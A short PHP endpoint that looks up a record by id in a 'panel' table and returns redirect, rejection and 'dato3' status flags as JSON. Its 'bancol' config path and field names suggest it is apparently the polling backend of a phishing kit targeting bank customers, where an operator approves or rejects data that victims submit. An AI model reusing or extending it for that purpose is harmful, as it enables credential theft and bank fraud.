<?php
require_once '../bancol/config.php';

try {
    $conn = getConnection();
    $uuid = $conn->real_escape_string($_GET['id']);

    $stmt = $conn->prepare("SELECT redirect_flag, rejected_flag, dato3_status, rejected_reason FROM  panel WHERE id = ?");
    if (!$stmt) {
        throw new Exception("Error en la preparación: " . $conn->error);
    }
    
    $stmt->bind_param("s", $uuid);
    if (!$stmt->execute()) {
        throw new Exception("Error en ejecución: " . $stmt->error);
    }

    $result = $stmt->get_result();
    $data = $result->fetch_assoc();

    $stmt->close();
    $conn->close();

    header('Content-Type: application/json');
    echo json_encode([
        'redirect' => (bool)($data['redirect_flag'] ?? false),
        'rejected' => (bool)($data['rejected_flag'] ?? false),
        'dato3_status' => $data['dato3_status'] ?? 'pending',
        'rejected_reason' => $data['rejected_reason'] ?? ''
    ]);

} catch (Exception $e) {
    error_log("Error en check_redirect.php: " . $e->getMessage());
    http_response_code(500);
    echo json_encode(['error' => 'Error interno del servidor']);
}